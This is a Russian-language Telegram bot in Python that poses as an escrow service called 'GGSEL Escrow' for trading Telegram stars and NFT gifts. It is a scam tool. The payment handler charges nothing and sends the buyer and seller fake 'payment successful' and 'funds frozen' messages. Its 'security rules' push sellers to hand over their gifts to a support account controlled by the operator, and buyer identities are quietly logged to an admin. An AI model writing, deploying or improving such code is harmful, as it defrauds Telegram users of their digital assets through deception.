import logging
import asyncio
import random
import string
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8802204413:AAHR3Pv8p9fitrRbqDInANi5NJ4l3hraSiw"
ADMIN_ID = 123456789  

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

ORDERS_DB = {}

class OrderStates(StatesGroup):
    waiting_for_username = State()
    waiting_for_stars = State()
    waiting_for_description = State()

def generate_order_id():
    return "#" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))

def main_menu_kb():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="🆕 Создать ордер", callback_data="btn_create_order"))
    builder.row(
        types.InlineKeyboardButton(text="💳 Кошельки", callback_data="btn_wallets"),
        types.InlineKeyboardButton(text="🔔 Безопасность", callback_data="btn_security")
    )
    builder.row(
        types.InlineKeyboardButton(text="💙 Рефералы", callback_data="btn_referrals"),
        types.InlineKeyboardButton(text="☑️ Канал", url="https://t.me/your_channel")
    )
    builder.row(
        types.InlineKeyboardButton(text="💬 Поддержка", callback_data="btn_support"),
        types.InlineKeyboardButton(text="🔵 Язык", callback_data="btn_lang")
    )
    return builder.as_markup()

def back_to_menu_kb():
    return InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="◀️ Назад", callback_data="to_main")).as_markup()

def in_menu_kb():
    return InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main")).as_markup()

@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    args = message.text.split()
    
    if len(args) > 1:
        order_id = args[1]
        if not order_id.startswith("#"):
            order_id = "#" + order_id
            
        if order_id in ORDERS_DB:
            order = ORDERS_DB[order_id]
            
            if order["seller_id"] == message.from_user.id:
                kb = InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main")).as_markup()
                await message.answer("❌ **Нельзя подключиться к своему ордеру**", parse_mode="Markdown", reply_markup=kb)
                return

            try:
                buyer_info = f"@{message.from_user.username}" if message.from_user.username else "Без юзернейма"
                log_text = (
                    f"👑 **К ордеру {order_id} подключился покупатель**\n\n"
                    f"{buyer_info} (ID `{message.from_user.id}`)"
                )
                await bot.send_message(chat_id=order["seller_id"], text=log_text, parse_mode="Markdown")
                if order["seller_id"] != ADMIN_ID:
                    await bot.send_message(chat_id=ADMIN_ID, text=f"LOG: Пользователь {buyer_info} зашел в ордер {order_id}")
            except Exception as e:
                logging.error(f"Ошибка отправки лога: {e}")

            seller_username = order["seller_username"]
            seller_id = order["seller_id"]
            stars = order["stars"]
            desc = order["description"]
            
            buyer_text = (
                f"📋 **Ордер {order_id}**\n\n"
                f"👑 **Продавец:** @{seller_username} (ID `{seller_id}`)\n\n"
                f"📊 **Успешных ордеров:** 0\n\n"
                f"🛍️ **Вы покупаете:**\n{desc}\n\n"
                f"💵 **Цена:** {stars} звёзд\n\n"
                f"⭐ **Оплата из баланса звёзд Telegram**"
            )
            
            kb = InlineKeyboardBuilder()
            kb.row(types.InlineKeyboardButton(text="⭐ Оплатить", callback_data=f"buy_pay_{order_id[1:]}"))
            return await message.answer(buyer_text, parse_mode="Markdown", reply_markup=kb.as_markup())
        else:
            await message.answer("❌ **Ордер не найден или был отменен.**", reply_markup=main_menu_kb())
            return

    welcome_text = (
        "**Добро пожаловать 👋**\n\n"
        "🔷 **GGSEL Escrow** — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n"
        "1️⃣ **Автоматизированный алгоритм исполнения.**\n"
        "🚀 Скорость и автоматизация.\n"
        "💳 Удобный и быстрый вывод средств.\n\n"
        "• Комиссия сервиса: **1%**\n"
        "• Режим работы: **24/7**\n"
        "• Поддержка: @GGSEL_Escrow_Support\n\n"
        "🛡️ **Выберите нужный раздел ниже:**"
    )
    await message.answer(welcome_text, parse_mode="Markdown", reply_markup=main_menu_kb())

@dp.callback_query(F.data == "to_main")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    welcome_text = (
        "**Добро пожаловать 👋**\n\n"
        "🔷 **GGSEL Escrow** — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n"
        "🛡️ **Выберите нужный раздел ниже:**"
    )
    await callback.message.edit_text(welcome_text, parse_mode="Markdown", reply_markup=main_menu_kb())

@dp.callback_query(F.data == "btn_security")
async def view_security(callback: types.CallbackQuery):
    text = (
        "🛡️ **Правила безопасности**\n\n"
        "• Передавайте подарок **только** менеджеру @GGSEL_Escrow_Support\n\n"
        "• **Не отправляйте** напрямую покупателю — передача идёт через сервис\n\n"
        "• Сверяйте сумму и тег ордера в комментарии к платежу\n\n"
        "• После проверки покупатель подтверждает получение и ордер закрывается"
    )
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=in_menu_kb())

@dp.callback_query(F.data == "btn_wallets")
async def view_wallets(callback: types.CallbackQuery):
    text = "🔸 **TON-кошелёк не привязан**\n\nДобавьте его в разделе «Кошельки»"
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_to_menu_kb())

@dp.callback_query(F.data == "btn_support")
async def view_support(callback: types.CallbackQuery):
    text = "❗️ **Техническая поддержка**\n\nДля связи используйте кнопку ниже 👋"
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="Написать в поддержку ↗️", url="https://t.me/your_support_username"))
    kb.row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main"))
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=kb.as_markup())

@dp.callback_query(F.data == "btn_referrals")
async def view_referrals(callback: types.CallbackQuery):
    await callback.answer("Реферальная система временно на тех. обслуживании.", show_alert=True)

@dp.callback_query(F.data == "btn_lang")
async def view_lang(callback: types.CallbackQuery):
    await callback.answer("Выбран русский язык.", show_alert=True)

@dp.callback_query(F.data == "btn_create_order")
async def choose_payment_method(callback: types.CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.row(
        types.InlineKeyboardButton(text="📱 TON", callback_data="flow_pay_stars"),
        types.InlineKeyboardButton(text="📱 USDT (TON)", callback_data="flow_pay_stars")
    )
    kb.row(
        types.InlineKeyboardButton(text="💳 Карта/СБП", callback_data="flow_pay_stars"),
        types.InlineKeyboardButton(text="🆕 Звёзды", callback_data="flow_pay_stars")
    )
    kb.row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main"))
    await callback.message.edit_text("🔒 **Создание ордера**\n\n_Выберите способ оплаты со стороны покупателя_", parse_mode="Markdown", reply_markup=kb.as_markup())

@dp.callback_query(F.data == "flow_pay_stars")
async def ask_recipient_username(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "⭐️ **Получатель звёзд**\n\nУкажите `@username` получателя\n\n🛑 Минимум: **100 звёзд** 💬",
        parse_mode="Markdown",
        reply_markup=back_to_menu_kb()
    )
    await state.set_state(OrderStates.waiting_for_username)

@dp.message(OrderStates.waiting_for_username)
async def process_recipient_username(message: types.Message, state: FSMContext):
    username = message.text.strip().replace("@", "")
    await state.update_data(recipient=username)
    
    await message.answer(
        f"👤 @{username}\n⭐️ **Введите количество звёзд.**",
        reply_markup=InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main")).as_markup()
    )
    await state.set_state(OrderStates.waiting_for_stars)

@dp.message(OrderStates.waiting_for_stars)
async def process_stars_amount(message: types.Message, state: FSMContext):
    if not message.text.isdigit() or int(message.text) < 100:
        return await message.answer("❌ Пожалуйста, введите корректное число звёзд (минимум 100).")
    
    await state.update_data(stars=int(message.text))
    
    desc_text = (
        "📝 **Описание товара**\n\n"
        "_Опишите, что вы продаёте._ 💬\n\n"
        "**Если это NFT-подарок:**\n"
        "Зайдите в свой профиль Telegram → нажмите на подарок → три точки (...) → «Скопировать ссылку».\n\n"
        "Вставьте ссылку сюда. Если подарков несколько — каждую ссылку с новой строки.\n\n"
        "**Пример:**\n"
        "`https://t.me/nft/PlushPepe-1`\n\n"
        "_Или просто опишите товар:_ 2 Кристалла и 1 Бабочка"
    )
    await message.answer(desc_text, parse_mode="Markdown", reply_markup=InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main")).as_markup())
    await state.set_state(OrderStates.waiting_for_description)

@dp.message(OrderStates.waiting_for_description)
async def finalize_order(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    order_id = generate_order_id()
    bot_info = await bot.get_me()
    
    ORDERS_DB[order_id] = {
        "seller_id": message.from_user.id,
        "seller_username": message.from_user.username or "seller",
        "recipient": user_data["recipient"],
        "stars": user_data["stars"],
        "description": message.text
    }
    
    buyer_link = f"https://t.me/{bot_info.username}?start={order_id[1:]}"
    
    result_text = (
        f"📝 **{user_data['description']}**\n\n"
        f"💬 **Ордер создан** 💬\n\n"
        f"💰 **Сумма:** {user_data['stars']} STARS 💬\n\n"
        f"📝 **Описание:** {user_data['description']}\n\n"
        f"⚡️ **Ссылка для покупателя:**\n"
        f"`{buyer_link}`\n\n"
        f"⭐️ **Важно:** передача подарка выполняется 💬 через менеджера @GGSEL_Escrow_Support"
    )
    
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="📩 Поделиться ордером", switch_inline_query=f"Купить товар по ордеру {order_id}"))
    kb.row(types.InlineKeyboardButton(text="💬 Поддержка", callback_data="btn_support"))
    kb.row(types.InlineKeyboardButton(text="Отменить ордер", callback_data="to_main"))
    
    await message.answer(result_text, parse_mode="Markdown", reply_markup=kb.as_markup())
    await state.clear()

@dp.callback_query(F.data.startswith("buy_pay_"))
async def process_buyer_payment(callback: types.CallbackQuery):
    order_id = "#" + callback.data.split("_")[2]
    if order_id not in ORDERS_DB:
        return await callback.answer("Ордер устарел или был удален.", show_alert=True)
        
    order = ORDERS_DB[order_id]
    stars = order["stars"]
    
    await callback.message.edit_text("⏳ **Загрузка...**", parse_mode="Markdown")
    await asyncio.sleep(1.5)
    
    success_buyer_text = (
        f"⭐️ **{stars} звезд успешно списано с вашего баланса** 💬\n\n"
        f"Ордер `{order_id}` оплачен 💬"
    )
    kb = InlineKeyboardBuilder().row(types.InlineKeyboardButton(text="◀️ В меню", callback_data="to_main")).as_markup()
    await callback.message.answer(success_buyer_text, parse_mode="Markdown", reply_markup=kb)
    
    try:
        success_seller_text = (
            f"🔔 **Оплата по ордеру {order_id} учтена!**\n\n"
            f"Покупатель совершил транзакцию на сумму **{stars} STARS**.\n"
            f"Средства заморожены на балансе гаранта. Для завершения сделки свяжитесь с поддержкой."
        )
        await bot.send_message(chat_id=order["seller_id"], text=success_seller_text, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Не удалось отправить лог успешной оплаты: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
